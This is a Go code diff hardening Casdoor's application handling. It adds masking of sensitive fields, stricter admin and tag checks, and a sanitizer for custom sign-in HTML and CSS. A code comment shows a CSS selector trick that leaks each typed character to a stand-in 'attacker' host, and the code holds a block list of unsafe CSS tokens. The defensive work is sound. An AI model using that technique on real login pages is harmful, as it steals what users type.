@@ -17,10 +17,12 @@ package object
 import (
 	"errors"
 	"fmt"
+	"net"
 	"net/url"
 	"regexp"
 	"strings"
 
+	"github.com/casdoor/casdoor/conf"
 	"github.com/casdoor/casdoor/i18n"
 	"github.com/casdoor/casdoor/util"
 )
@@ -187,9 +189,12 @@ func extendApplicationWithSigninMethods(application *Application) (err error) {
 		application.SigninMethods = append(application.SigninMethods, signinMethod)
 	}
 
-	if len(application.SigninMethods) == 0 {
-		signinMethod := &SigninMethod{Name: "Password", DisplayName: "Password", Rule: "All"}
-		application.SigninMethods = append(application.SigninMethods, signinMethod)
+	// The "Hide password" rule used to be named "Hide-Password", normalize the legacy
+	// value so that the frontend and the backend agree on what is hidden
+	for _, signinMethod := range application.SigninMethods {
+		if signinMethod != nil && signinMethod.Rule == SigninMethodRuleHidePasswordLegacy {
+			signinMethod.Rule = SigninMethodRuleHidePassword
+		}
 	}
 
 	return
@@ -213,6 +218,22 @@ func extendApplicationWithSignupItems(application *Application) (err error) {
 	return
 }
 
+func isApplicationAdmin(user *User, application *Application) (bool, error) {
+	if user.IsGlobalAdmin() {
+		return true, nil
+	}
+	if !user.IsAdmin || user.Owner != application.Organization {
+		return false, nil
+	}
+
+	storedApplication := &Application{Owner: application.Owner, Name: application.Name}
+	existed, err := ormer.Engine.Cols("organization").Get(storedApplication)
+	if err != nil {
+		return false, err
+	}
+	return existed && storedApplication.Organization == user.Owner, nil
+}
+
 func GetMaskedApplication(application *Application, userId string) *Application {
 	if application == nil {
 		return nil
@@ -231,16 +252,24 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 
 	isOrgUser := false
 	if userId != "" {
-		if isUserIdGlobalAdmin(userId) {
+		isGlobalAdmin, err := isUserIdGlobalAdmin(userId)
+		if err != nil {
+			panic(err)
+		}
+		if isGlobalAdmin {
 			return application
 		}
 
-		user, err := GetUser(userId)
+		user, err := GetUserOrAppUser(userId)
 		if err != nil {
 			panic(err)
 		}
 		if user != nil {
-			if user.IsApplicationAdmin(application) {
+			isAdmin, err := isApplicationAdmin(user, application)
+			if err != nil {
+				panic(err)
+			}
+			if isAdmin {
 				return application
 			}
 
@@ -266,6 +295,7 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 	application.EnableWebAuthn = false
 	application.EnableLinkWithEmail = false
 	application.SamlReplyUrl = "***"
+	application.SamlSingleLogoutUrl = "***"
 
 	providerItems := []*ProviderItem{}
 	for _, providerItem := range application.Providers {
@@ -274,7 +304,7 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 		}
 
 		category := providerItem.Provider.Category
-		if category == "OAuth" || category == "Web3" || category == "Captcha" || category == "SAML" || category == "Face ID" {
+		if category == "OAuth" || category == "Captcha" || category == "SAML" || category == "Face ID" {
 			providerItems = append(providerItems, providerItem)
 		} else if category == "Email" || category == "SMS" {
 			// The login pages need to know whether an Email or SMS provider is available,
@@ -288,6 +318,18 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 					Category: category,
 				},
 			})
+		} else if category == "MFA" || category == "Notification" {
+			// the MFA setup page needs the provider's ID, but not its config
+			providerItems = append(providerItems, &ProviderItem{
+				CountryCodes: providerItem.CountryCodes,
+				Rule:         providerItem.Rule,
+				Provider: &Provider{
+					Owner:    providerItem.Provider.Owner,
+					Name:     providerItem.Provider.Name,
+					Category: category,
+					Type:     providerItem.Provider.Type,
+				},
+			})
 		}
 	}
 	application.Providers = providerItems
@@ -298,6 +340,8 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 	application.TokenFields = []string{}
 	application.TokenSigningMethod = "***"
 	application.TokenAttributes = []*JwtItem{}
+	application.FederatedCredentials = []*FederatedCredential{}
+	application.TokenGroupFormat = "***"
 	application.ExpireInHours = -1
 	application.RefreshExpireInHours = -1
 	application.CookieExpireInHours = -1
@@ -340,7 +384,11 @@ func GetMaskedApplication(application *Application, userId string) *Application 
 }
 
 func GetMaskedApplications(applications []*Application, userId string) []*Application {
-	if isUserIdGlobalAdmin(userId) {
+	isGlobalAdmin, err := isUserIdGlobalAdmin(userId)
+	if err != nil {
+		panic(err)
+	}
+	if isGlobalAdmin {
 		return applications
 	}
 
@@ -355,11 +403,15 @@ func GetAllowedApplications(applications []*Application, userId string, lang str
 		return nil, errors.New(i18n.Translate(lang, "auth:Unauthorized operation"))
 	}
 
-	if isUserIdGlobalAdmin(userId) {
+	isGlobalAdmin, err := isUserIdGlobalAdmin(userId)
+	if err != nil {
+		return nil, err
+	}
+	if isGlobalAdmin {
 		return applications, nil
 	}
 
-	user, err := GetUser(userId)
+	user, err := GetUserOrAppUser(userId)
 	if err != nil {
 		return nil, err
 	}
@@ -378,18 +430,34 @@ func GetAllowedApplications(applications []*Application, userId string, lang str
 		if err != nil {
 			return nil, err
 		}
-
-		if allowed {
-			res = append(res, application)
+		if !allowed {
+			continue
 		}
+
+		// same tag rule as the login check in controllers/auth.go
+		if len(application.Tags) > 0 && !util.HasTagInSlice(application.Tags, user.Tag) {
+			continue
+		}
+
+		res = append(res, application)
 	}
 	return res, nil
 }
 
 func checkMultipleCaptchaProviders(application *Application, lang string) error {
+	// API clients may send the provider items without the providers themselves
+	m, err := getProviderMap(application.Organization)
+	if err != nil {
+		return err
+	}
+
 	var captchaProviders []string
 	for _, providerItem := range application.Providers {
-		if providerItem.Provider != nil && providerItem.Provider.Category == "Captcha" {
+		provider := providerItem.Provider
+		if provider == nil {
+			provider = m[providerItem.Name]
+		}
+		if provider != nil && provider.Category == "Captcha" {
 			captchaProviders = append(captchaProviders, providerItem.Name)
 		}
 	}
@@ -401,17 +469,230 @@ func checkMultipleCaptchaProviders(application *Application, lang string) error 
 	return nil
 }
 
+// KeepApplicationCustomHtml keeps what an organization admin may put on the sign-in pages to layout
+// and branding: custom HTML or CSS that could collect or send out what users type is replaced with
+// the one from oldApplication (nil for a new application). A global admin is not held to this.
+func KeepApplicationCustomHtml(application *Application, oldApplication *Application) {
+	if oldApplication == nil {
+		oldApplication = &Application{}
+	}
+
+	var prefixes []string
+	keepSafeHtml := func(text string, oldText string) string {
+		if text == oldText || text == "" {
+			return text
+		}
+		if prefixes == nil {
+			prefixes = getCssUrlPrefixes()
+		}
+		if isHtmlSafeFor(text, prefixes) {
+			return text
+		}
+		return oldText
+	}
+
+	application.HeaderHtml = keepSafeHtml(application.HeaderHtml, oldApplication.HeaderHtml)
+	application.PageHtml = keepSafeHtml(application.PageHtml, oldApplication.PageHtml)
+	application.FooterHtml = keepSafeHtml(application.FooterHtml, oldApplication.FooterHtml)
+	application.FormSideHtml = keepSafeHtml(application.FormSideHtml, oldApplication.FormSideHtml)
+	application.SigninHtml = keepSafeHtml(application.SigninHtml, oldApplication.SigninHtml)
+	application.SignupHtml = keepSafeHtml(application.SignupHtml, oldApplication.SignupHtml)
+	application.FormCss = keepSafeCss(application.FormCss, oldApplication.FormCss)
+	application.FormCssMobile = keepSafeCss(application.FormCssMobile, oldApplication.FormCssMobile)
+
+	// a custom sign-in item renders its customCss as HTML
+	oldSigninCss := map[string]string{}
+	for _, item := range oldApplication.SigninItems {
+		if item != nil {
+			oldSigninCss[item.Name] = item.CustomCss
+		}
+	}
+	for _, item := range application.SigninItems {
+		if isCustomSigninItem(item) {
+			item.CustomCss = keepSafeHtml(item.CustomCss, oldSigninCss[item.Name])
+		} else if item != nil {
+			item.CustomCss = keepSafeCss(item.CustomCss, oldSigninCss[item.Name])
+		}
+	}
+
+	// a custom sign-up item ("Text N") renders its label as HTML
+	oldSignupHtmls := map[string]string{}
+	oldSignupCss := map[string]string{}
+	for _, item := range oldApplication.SignupItems {
+		if isCustomSignupItem(item) {
+			oldSignupHtmls[item.Name] = item.Label
+		}
+		if item != nil {
+			oldSignupCss[item.Name] = item.CustomCss
+		}
+	}
+	for _, item := range application.SignupItems {
+		if isCustomSignupItem(item) {
+			item.Label = keepSafeHtml(item.Label, oldSignupHtmls[item.Name])
+		}
+		if item != nil {
+			item.CustomCss = keepSafeCss(item.CustomCss, oldSignupCss[item.Name])
+		}
+	}
+}
+
+// Form CSS may load images and fonts, but only from places whose access logs an organization
+// admin cannot read: a selector per typed character, e.g.,
+// input[value^="a"] { background: url(https://attacker/a) }, would otherwise send out what users type.
+var unsafeCssTokens = []string{"\\", "<", "image(", "image-set(", "cross-fade(", "element(", "src("}
+
+var cssUrlPrefixes = []string{
+	"https://fonts.googleapis.com/",
+	"https://fonts.gstatic.com/",
+	"https://cdn.jsdelivr.net/gh/casdoor/",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+	"https://cdn.casbin.org/",
+	"https://cdn.casdoor.com/",
+	"https://cdn.casvisor.com/",
+}
+
+// a stylesheet pulled in by @import is not checked itself, so it may only come from font services
+// whose stylesheets point at their own font files
+var cssImportPrefixes = []string{
+	"https://fonts.googleapis.com/css",
+	"https://cdn.jsdelivr.net/npm/@fontsource/",
+	"https://cdn.jsdelivr.net/npm/@fontsource-variable/",
+}
+
+var (
+	reStyleTag  = regexp.MustCompile(`(?i)</?style[^>]*>`)
+	reCssUrl    = regexp.MustCompile(`url\(\s*(?:"([^"]*)"|'([^']*)'|([^"'()\s]*))\s*\)`)
+	reCssImport = regexp.MustCompile(`@import\s*(?:url\(\s*)?(?:"([^"]*)"|'([^']*)'|([^"'()\s;]+))`)
+)
+
+// getCssUrlPrefixes adds the operator's own places to the built-in ones: this Casdoor's origin, the
+// global storage providers and the formCssAllowedUrls setting.
+func getCssUrlPrefixes() []string {
+	prefixes := append([]string{}, cssUrlPrefixes...)
+	addPrefix := func(prefix string) {
+		prefix = strings.ToLower(strings.TrimSpace(prefix))
+		if prefix == "" {
+			return
+		}
+		if !strings.Contains(prefix, "://") {
+			prefix = "https://" + prefix
+		}
+		if strings.Count(prefix, "/") < 3 {
+			prefix += "/"
+		}
+		prefixes = append(prefixes, prefix)
+	}
+
+	addPrefix(conf.GetConfigString("origin"))
+	for _, prefix := range strings.Split(conf.GetConfigString("formCssAllowedUrls"), ",") {
+		addPrefix(prefix)
+	}
+	providers, err := GetProvidersByCategory("admin", "Storage")
+	if err == nil {
+		for _, provider := range providers {
+			addPrefix(provider.Domain)
+		}
+	}
+	return prefixes
+}
+
+func getCssUrl(match []string) string {
+	return strings.TrimSpace(match[1] + match[2] + match[3])
+}
+
+func isCssUrlAllowed(cssUrl string, prefixes []string, allowLocal bool) bool {
+	if strings.HasPrefix(cssUrl, "data:") || strings.HasPrefix(cssUrl, "#") {
+		return allowLocal
+	}
+	// browsers drop tabs and newlines from a URL and resolve dot segments, either of which could
+	// turn an allowed-looking URL into another one
+	for _, r := range cssUrl {
+		if r <= ' ' || r == 0x7f {
+			return false
+		}
+	}
+	if strings.Contains(cssUrl, "..") || strings.Contains(cssUrl, "%2e") || strings.Contains(cssUrl, "%2f") || strings.Contains(cssUrl, "%5c") {
+		return false
+	}
+
+	parsed, err := url.Parse(cssUrl)
+	if err != nil {
+		return false
+	}
+	if parsed.Scheme == "" && parsed.Host == "" && !strings.HasPrefix(cssUrl, "//") {
+		return allowLocal
+	}
+	for _, prefix := range prefixes {
+		if strings.HasPrefix(cssUrl, prefix) {
+			return true
+		}
+	}
+	return false
+}
+
+func isCssSafe(css string) bool {
+	return isCssSafeFor(css, nil)
+}
+
+// isCssSafeFor checks css against prefixes, or against getCssUrlPrefixes() when it is nil.
+func isCssSafeFor(css string, prefixes []string) bool {
+	lowerCss := strings.ToLower(reStyleTag.ReplaceAllString(css, ""))
+	for _, token := range unsafeCssTokens {
+		if strings.Contains(lowerCss, token) {
+			return false
+		}
+	}
+
+	if !strings.Contains(lowerCss, "url(") && !strings.Contains(lowerCss, "@import") {
+		return true
+	}
+
+	// every url( and @import has to be one the patterns read, so none can hide from the check
+	urls := reCssUrl.FindAllStringSubmatch(lowerCss, -1)
+	imports := reCssImport.FindAllStringSubmatch(lowerCss, -1)
+	if len(urls) != strings.Count(lowerCss, "url(") || len(imports) != strings.Count(lowerCss, "@import") {
+		return false
+	}
+
+	if prefixes == nil {
+		prefixes = getCssUrlPrefixes()
+	}
+	for _, match := range urls {
+		if !isCssUrlAllowed(getCssUrl(match), prefixes, true) {
+			return false
+		}
+	}
+	for _, match := range imports {
+		if !isCssUrlAllowed(getCssUrl(match), cssImportPrefixes, false) {
+			return false
+		}
+	}
+	return true
+}
+
+func keepSafeCss(css string, oldCss string) string {
+	if css == oldCss || isCssSafe(css) {
+		return css
+	}
+	return oldCss
+}
+
+func isCustomSigninItem(item *SigninItem) bool {
+	return item != nil && (item.IsCustom || strings.HasPrefix(item.Name, "Text "))
+}
+
+func isCustomSignupItem(item *SignupItem) bool {
+	return item != nil && strings.HasPrefix(item.Name, "Text ")
+}
+
 func (application *Application) GetId() string {
 	return fmt.Sprintf("%s/%s", application.Owner, application.Name)
 }
 
 func (application *Application) IsRedirectUriValid(redirectUri string) bool {
-	isValid, err := util.IsValidOrigin(redirectUri)
-	if err != nil {
-		panic(err)
-	}
-	if isValid {
-		return true
+	if isScriptUrl(redirectUri) {
+		return false
 	}
 
 	for _, targetUri := range application.RedirectUris {
@@ -464,7 +745,7 @@ func redirectUriMatchesTarget(redirectUri, targetUri *url.URL) bool {
 	if redirectUri.Scheme != targetUri.Scheme {
 		return false
 	}
-	if redirectUri.Port() != targetUri.Port() {
+	if redirectUri.Port() != targetUri.Port() && !isSameLoopbackHost(redirectUri, targetUri) {
 		return false
 	}
 	redirectHost := redirectUri.Hostname()
@@ -481,14 +762,9 @@ func redirectUriMatchesTarget(redirectUri, targetUri *url.URL) bool {
 func (application *Application) IsPasswordEnabled() bool {
 	if len(application.SigninMethods) == 0 {
 		return application.EnablePassword
-	} else {
-		for _, signinMethod := range application.SigninMethods {
-			if signinMethod.Name == "Password" {
-				return true
-			}
-		}
-		return false
 	}
+
+	return application.HasSigninMethod("Password")
 }
 
 func (application *Application) IsPasswordWithLdapEnabled() bool {
@@ -530,37 +806,57 @@ func (application *Application) IsCodeSigninViaSmsEnabled() bool {
 	}
 }
 
-func (application *Application) IsLdapEnabled() bool {
-	if len(application.SigninMethods) > 0 {
-		for _, signinMethod := range application.SigninMethods {
-			if signinMethod.Name == "LDAP" {
-				return true
-			}
+func (application *Application) IsMagicLinkEnabled() bool {
+	return application.HasSigninMethod("Magic link")
+}
+
+// IsMagicLinkSignupEnabled tells whether a link may also create the account, the
+// application has to allow the signup itself as well.
+func (application *Application) IsMagicLinkSignupEnabled() bool {
+	if !application.IsSelfSignupEnabled() {
+		return false
+	}
+
+	for _, signinMethod := range application.SigninMethods {
+		if signinMethod != nil && signinMethod.Name == "Magic link" && signinMethod.Rule == SigninMethodRuleMagicLinkSignup && !signinMethod.IsHidden() {
+			return true
 		}
 	}
+
 	return false
+}
+
+// IsSelfSignupEnabled tells whether users may sign themselves up on the signup page, by a
+// magic link or by a verification code. "Disable self signup" leaves only the signups of
+// the application's providers (e.g. the first SSO login of a new employee) and of the
+// invitation codes an admin hands out
+func (application *Application) IsSelfSignupEnabled() bool {
+	return application.EnableSignUp && !application.DisableSelfSignup
+}
+
+func (application *Application) IsSignupAllowedFor(organization string) bool {
+	if organization == "built-in" {
+		return false
+	}
+	if application.IsShared {
+		return true
+	}
+	return organization == application.Organization
+}
+
+func (application *Application) IsLdapEnabled() bool {
+	return application.HasSigninMethod("LDAP")
+}
+
+func (application *Application) IsWebAuthnEnabled() bool {
+	return application.HasSigninMethod("WebAuthn")
 }
 
 func (application *Application) IsFaceIdEnabled() bool {
-	if len(application.SigninMethods) > 0 {
-		for _, signinMethod := range application.SigninMethods {
-			if signinMethod.Name == "Face ID" {
-				return true
-			}
-		}
-	}
-	return false
+	return application.HasSigninMethod("Face ID")
 }
 
 func (application *Application) IsOriginValid(origin string) bool {
-	isValid, err := util.IsValidOrigin(origin)
-	if err != nil {
-		panic(err)
-	}
-	if isValid {
-		return true
-	}
-
 	originObj, err := url.Parse(origin)
 	if err != nil || originObj.Host == "" {
 		return false
@@ -581,12 +877,20 @@ func (application *Application) IsOriginValid(origin string) bool {
 		if originHost != targetHost && !strings.HasSuffix(originHost, "."+targetHost) {
 			continue
 		}
-		if originObj.Port() != targetObj.Port() {
+		if originObj.Port() != targetObj.Port() && !isSameLoopbackHost(originObj, targetObj) {
 			continue
 		}
 		return true
 	}
 	return false
+}
+
+func isSameLoopbackHost(uri *url.URL, targetUri *url.URL) bool {
+	host := uri.Hostname()
+	if host != targetUri.Hostname() {
+		return false
+	}
+	return host == "localhost" || net.ParseIP(host).IsLoopback()
 }
 
 func IsOriginAllowed(origin string) (bool, error) {
@@ -596,7 +900,7 @@ func IsOriginAllowed(origin string) (bool, error) {
 	}
 
 	for _, application := range applications {
-		if application.IsOriginValid(origin) {
+		if !application.IsDynamicClient() && application.IsOriginValid(origin) {
 			return true, nil
 		}
 	}
